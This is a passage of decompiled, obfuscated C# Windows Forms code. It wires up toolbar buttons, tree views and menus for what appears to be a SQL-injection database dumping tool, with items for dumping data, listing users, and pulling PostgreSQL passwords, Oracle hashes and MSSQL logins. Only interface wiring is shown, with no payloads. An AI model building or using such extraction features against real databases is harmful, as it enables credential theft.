		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton tsbSchemas_0
	{
		[CompilerGenerated]
		get
		{
			return _tsbSchemas_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_83;
			ToolStripButton toolStripButton = _tsbSchemas_0;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_tsbSchemas_0 = value;
			toolStripButton = _tsbSchemas_0;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("tscSchemasSP")]
	internal virtual ToolStripSeparator tscSchemasSP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton tsbSchemas_1
	{
		[CompilerGenerated]
		get
		{
			return _tsbSchemas_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_84;
			ToolStripButton toolStripButton = _tsbSchemas_1;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_tsbSchemas_1 = value;
			toolStripButton = _tsbSchemas_1;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	internal virtual ToolStripButton tsbSchemas_2
	{
		[CompilerGenerated]
		get
		{
			return _tsbSchemas_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_85;
			ToolStripButton toolStripButton = _tsbSchemas_2;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_tsbSchemas_2 = value;
			toolStripButton = _tsbSchemas_2;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("tscSchemasSP1")]
	internal virtual ToolStripSeparator tscSchemasSP1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnServerInfo
	{
		[CompilerGenerated]
		get
		{
			return _btnServerInfo;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_90;
			ToolStripButton toolStripButton = _btnServerInfo;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnServerInfo = value;
			toolStripButton = _btnServerInfo;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	public virtual ToolStripButton tsbSchemas_3
	{
		[CompilerGenerated]
		get
		{
			return _tsbSchemas_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_86;
			ToolStripButton toolStripButton = _tsbSchemas_3;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_tsbSchemas_3 = value;
			toolStripButton = _tsbSchemas_3;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("tbcMain")]
	internal virtual TabControl tbcMain
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tpSchema")]
	internal virtual TabPage tpSchema
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("splSchema")]
	internal virtual SplitContainer splSchema
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TreeViewExt trwSchema
	{
		[CompilerGenerated]
		get
		{
			return _trwSchema;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			TreeViewEventHandler value2 = method_55;
			TreeViewEventHandler value3 = method_56;
			KeyEventHandler value4 = method_57;
			TreeNodeMouseClickEventHandler value5 = method_151;
			TreeViewExt treeViewExt = _trwSchema;
			if (treeViewExt != null)
			{
				treeViewExt.AfterCheck -= value2;
				treeViewExt.AfterSelect -= value3;
				treeViewExt.KeyUp -= value4;
				treeViewExt.NodeMouseClick -= value5;
			}
			_trwSchema = value;
			treeViewExt = _trwSchema;
			if (treeViewExt != null)
			{
				treeViewExt.AfterCheck += value2;
				treeViewExt.AfterSelect += value3;
				treeViewExt.KeyUp += value4;
				treeViewExt.NodeMouseClick += value5;
			}
		}
	}

	[field: AccessedThroughProperty("grbWhere")]
	internal virtual GroupBox grbWhere
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtSchemaWhere")]
	internal virtual TextBox txtSchemaWhere
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tsConvert1")]
	internal virtual ToolStrip tsConvert1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnFiltersClear1
	{
		[CompilerGenerated]
		get
		{
			return _btnFiltersClear1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_121;
			ToolStripButton toolStripButton = _btnFiltersClear1;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnFiltersClear1 = value;
			toolStripButton = _btnFiltersClear1;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("btnConvert")]
	internal virtual ToolStripDropDownButton btnConvert
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripDropDownButton1")]
	internal virtual ToolStripDropDownButton ToolStripDropDownButton1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbOrderBy")]
	internal virtual GroupBox grbOrderBy
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtSchemaOrderBy")]
	internal virtual TextBox txtSchemaOrderBy
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tsSchema")]
	internal virtual ToolStrip tsSchema
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblCountBDs")]
	internal virtual ToolStripLabel lblCountBDs
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripSeparator22")]
	internal virtual ToolStripSeparator ToolStripSeparator22
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnClearSchema
	{
		[CompilerGenerated]
		get
		{
			return _btnClearSchema;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_67;
			ToolStripButton toolStripButton = _btnClearSchema;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnClearSchema = value;
			toolStripButton = _btnClearSchema;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator13")]
	internal virtual ToolStripSeparator ToolStripSeparator13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnDataBases
	{
		[CompilerGenerated]
		get
		{
			return _btnDataBases;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_91;
			ToolStripButton toolStripButton = _btnDataBases;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnDataBases = value;
			toolStripButton = _btnDataBases;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator5")]
	internal virtual ToolStripSeparator ToolStripSeparator5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnTables
	{
		[CompilerGenerated]
		get
		{
			return _btnTables;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_92;
			ToolStripButton toolStripButton = _btnTables;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnTables = value;
			toolStripButton = _btnTables;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	internal virtual ToolStripButton btnColumns
	{
		[CompilerGenerated]
		get
		{
			return _btnColumns;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_93;
			ToolStripButton toolStripButton = _btnColumns;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnColumns = value;
			toolStripButton = _btnColumns;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	internal virtual ToolStripButton btnDumpData
	{
		[CompilerGenerated]
		get
		{
			return _btnDumpData;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_94;
			ToolStripButton toolStripButton = _btnDumpData;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnDumpData = value;
			toolStripButton = _btnDumpData;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	internal virtual ToolStripButton btnColumnUp
	{
		[CompilerGenerated]
		get
		{
			return _btnColumnUp;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_96;
			ToolStripButton toolStripButton = _btnColumnUp;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnColumnUp = value;
			toolStripButton = _btnColumnUp;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	internal virtual ToolStripButton btnColumnDown
	{
		[CompilerGenerated]
		get
		{
			return _btnColumnDown;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_96;
			ToolStripButton toolStripButton = _btnColumnDown;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnColumnDown = value;
			toolStripButton = _btnColumnDown;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("tpQuery")]
	internal virtual TabPage tpQuery
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("splQuery")]
	internal virtual SplitContainer splQuery
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtCustomQuery")]
	internal virtual TextBox txtCustomQuery
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblSelect")]
	internal virtual Label lblSelect
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox txtCustomQueryFrom
	{
		[CompilerGenerated]
		get
		{
			return _txtCustomQueryFrom;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_102;
			TextBox textBox = _txtCustomQueryFrom;
			if (textBox != null)
			{
				textBox.TextChanged -= value2;
			}
			_txtCustomQueryFrom = value;
			textBox = _txtCustomQueryFrom;
			if (textBox != null)
			{
				textBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblFrom")]
	internal virtual Label lblFrom
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tsCustomDump")]
	internal virtual ToolStrip tsCustomDump
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnDumpCustom
	{
		[CompilerGenerated]
		get
		{
			return _btnDumpCustom;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_95;
			ToolStripButton toolStripButton = _btnDumpCustom;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnDumpCustom = value;
			toolStripButton = _btnDumpCustom;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	internal virtual ToolStripButton btnDefCustomQuery
	{
		[CompilerGenerated]
		get
		{
			return _btnDefCustomQuery;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_103;
			ToolStripButton toolStripButton = _btnDefCustomQuery;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnDefCustomQuery = value;
			toolStripButton = _btnDefCustomQuery;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator19")]
	internal virtual ToolStripSeparator ToolStripSeparator19
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnuTemplates")]
	internal virtual ToolStripDropDownButton mnuTemplates
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripSeparator9")]
	internal virtual ToolStripSeparator ToolStripSeparator9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnuConvert")]
	internal virtual ToolStripDropDownButton mnuConvert
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual CheckBox chkMSSQLCastAsChar
	{
		[CompilerGenerated]
		get
		{
			return _chkMSSQLCastAsChar;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_97;
			CheckBox checkBox = _chkMSSQLCastAsChar;
			if (checkBox != null)
			{
				checkBox.CheckedChanged -= value2;
			}
			_chkMSSQLCastAsChar = value;
			checkBox = _chkMSSQLCastAsChar;
			if (checkBox != null)
			{
				checkBox.CheckedChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("chkMSSQL_Latin1")]
	internal virtual CheckBox chkMSSQL_Latin1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cmbMSSQLCast")]
	internal virtual ComboBox cmbMSSQLCast
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("splData")]
	internal virtual SplitContainer splData
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ctmTemplatesPostgreSQL")]
	internal virtual ContextMenuStrip ctmTemplatesPostgreSQL
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuPostgreSQL_ListUsers
	{
		[CompilerGenerated]
		get
		{
			return _mnuPostgreSQL_ListUsers;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_135;
			ToolStripMenuItem toolStripMenuItem = _mnuPostgreSQL_ListUsers;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuPostgreSQL_ListUsers = value;
			toolStripMenuItem = _mnuPostgreSQL_ListUsers;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuPostgreSQL_Passwords
	{
		[CompilerGenerated]
		get
		{
			return _mnuPostgreSQL_Passwords;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_136;
			ToolStripMenuItem toolStripMenuItem = _mnuPostgreSQL_Passwords;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuPostgreSQL_Passwords = value;
			toolStripMenuItem = _mnuPostgreSQL_Passwords;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuPostgreSQL_Join
	{
		[CompilerGenerated]
		get
		{
			return _mnuPostgreSQL_Join;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_137;
			ToolStripMenuItem toolStripMenuItem = _mnuPostgreSQL_Join;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuPostgreSQL_Join = value;
			toolStripMenuItem = _mnuPostgreSQL_Join;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ctmTemplatesOracle")]
	internal virtual ContextMenuStrip ctmTemplatesOracle
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuOracleListUsers
	{
		[CompilerGenerated]
		get
		{
			return _mnuOracleListUsers;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_131;
			ToolStripMenuItem toolStripMenuItem = _mnuOracleListUsers;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuOracleListUsers = value;
			toolStripMenuItem = _mnuOracleListUsers;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuOracleHashes
	{
		[CompilerGenerated]
		get
		{
			return _mnuOracleHashes;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_133;
			ToolStripMenuItem toolStripMenuItem = _mnuOracleHashes;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuOracleHashes = value;
			toolStripMenuItem = _mnuOracleHashes;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuOracleJoin
	{
		[CompilerGenerated]
		get
		{
			return _mnuOracleJoin;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_134;
			ToolStripMenuItem toolStripMenuItem = _mnuOracleJoin;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuOracleJoin = value;
			toolStripMenuItem = _mnuOracleJoin;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator24")]
	internal virtual ToolStripSeparator ToolStripSeparator24
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuOracleHelp
	{
		[CompilerGenerated]
		get
		{
			return _mnuOracleHelp;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_132;
			ToolStripMenuItem toolStripMenuItem = _mnuOracleHelp;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuOracleHelp = value;
			toolStripMenuItem = _mnuOracleHelp;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ctmTemplatesMSSQL")]
	internal virtual ContextMenuStrip ctmTemplatesMSSQL
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuSqlLogins
	{
		[CompilerGenerated]
		get
		{
			return _mnuSqlLogins;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_126;
			ToolStripMenuItem toolStripMenuItem = _mnuSqlLogins;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuSqlLogins = value;
			toolStripMenuItem = _mnuSqlLogins;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuSqlIsAdmin
	{
		[CompilerGenerated]
		get
		{
			return _mnuSqlIsAdmin;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_127;
			ToolStripMenuItem toolStripMenuItem = _mnuSqlIsAdmin;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuSqlIsAdmin = value;
			toolStripMenuItem = _mnuSqlIsAdmin;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuSQLJoin
	{
		[CompilerGenerated]
		get
		{
			return _mnuSQLJoin;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_128;
			ToolStripMenuItem toolStripMenuItem = _mnuSQLJoin;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuSQLJoin = value;
			toolStripMenuItem = _mnuSQLJoin;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripMenuItem1")]
	internal virtual ToolStripSeparator ToolStripMenuItem1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuSQLHelp
	{
		[CompilerGenerated]
		get
		{
			return _mnuSQLHelp;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_129;
			ToolStripMenuItem toolStripMenuItem = _mnuSQLHelp;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuSQLHelp = value;
			toolStripMenuItem = _mnuSQLHelp;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual BackgroundWorker bckWorker
	{
		[CompilerGenerated]
		get
		{
			return backgroundWorker_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = method_11;
			ProgressChangedEventHandler value3 = method_12;
			RunWorkerCompletedEventHandler value4 = method_13;
			BackgroundWorker backgroundWorker = backgroundWorker_0;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
				backgroundWorker.ProgressChanged -= value3;
				backgroundWorker.RunWorkerCompleted -= value4;
			}
			backgroundWorker_0 = value;
			backgroundWorker = backgroundWorker_0;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
				backgroundWorker.ProgressChanged += value3;
				backgroundWorker.RunWorkerCompleted += value4;
			}
		}
	}

	internal virtual ToolTip tlpUrl
	{
		[CompilerGenerated]
		get
		{
			return toolTip_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			toolTip_0 = value;
		}
	}

	[field: AccessedThroughProperty("ctmTemplatesFilters")]
	internal virtual ContextMenuStrip ctmTemplatesFilters
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuFilters1
	{
		[CompilerGenerated]
		get
		{
			return _mnuFilters1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_120;
			ToolStripMenuItem toolStripMenuItem = _mnuFilters1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuFilters1 = value;
			toolStripMenuItem = _mnuFilters1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuFilters2
	{
		[CompilerGenerated]
		get
		{
			return _mnuFilters2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_120;
			ToolStripMenuItem toolStripMenuItem = _mnuFilters2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuFilters2 = value;
			toolStripMenuItem = _mnuFilters2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuFilters5
	{
		[CompilerGenerated]
		get
		{
			return _mnuFilters5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_120;
			ToolStripMenuItem toolStripMenuItem = _mnuFilters5;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuFilters5 = value;
			toolStripMenuItem = _mnuFilters5;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuFilters6
	{
		[CompilerGenerated]
		get
		{
			return _mnuFilters6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_120;
			ToolStripMenuItem toolStripMenuItem = _mnuFilters6;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuFilters6 = value;
			toolStripMenuItem = _mnuFilters6;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuFilters7
	{
		[CompilerGenerated]
		get
		{
			return _mnuFilters7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_120;
			ToolStripMenuItem toolStripMenuItem = _mnuFilters7;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuFilters7 = value;
			toolStripMenuItem = _mnuFilters7;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuFilters8
	{
		[CompilerGenerated]
		get
		{
			return _mnuFilters8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_120;
			ToolStripMenuItem toolStripMenuItem = _mnuFilters8;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuFilters8 = value;
			toolStripMenuItem = _mnuFilters8;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuFilters9
	{
		[CompilerGenerated]
		get
		{
			return _mnuFilters9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_120;
			ToolStripMenuItem toolStripMenuItem = _mnuFilters9;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuFilters9 = value;
			toolStripMenuItem = _mnuFilters9;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuFilters10
	{
		[CompilerGenerated]
		get
		{
			return _mnuFilters10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_120;
			ToolStripMenuItem toolStripMenuItem = _mnuFilters10;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuFilters10 = value;
			toolStripMenuItem = _mnuFilters10;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuFilters3
	{
		[CompilerGenerated]
		get
		{
			return _mnuFilters3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_120;
			ToolStripMenuItem toolStripMenuItem = _mnuFilters3;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuFilters3 = value;
			toolStripMenuItem = _mnuFilters3;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripMenuItem12")]
	internal virtual ToolStripMenuItem ToolStripMenuItem12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ContextMenuStrip ctmSchema
	{
		[CompilerGenerated]
		get
		{
			return _mnuListView_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			CancelEventHandler value2 = method_118;
			ContextMenuStrip mnuListView_ = _mnuListView_2;
			if (mnuListView_ != null)
			{
				mnuListView_.Opening -= value2;
			}
			_mnuListView_2 = value;
			mnuListView_ = _mnuListView_2;
			if (mnuListView_ != null)
			{
				mnuListView_.Opening += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuSchema0")]
	internal virtual ToolStripMenuItem mnuSchema0
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnuSchema1")]
	internal virtual ToolStripMenuItem mnuSchema1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnuSchema2")]
	internal virtual ToolStripMenuItem mnuSchema2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnuSchema3")]
	internal virtual ToolStripMenuItem mnuSchema3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnuSchema4")]
	internal virtual ToolStripMenuItem mnuSchema4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnuSchema5")]
	internal virtual ToolStripMenuItem mnuSchema5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnuSchema6")]
	internal virtual ToolStripMenuItem mnuSchema6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnuSchema7")]
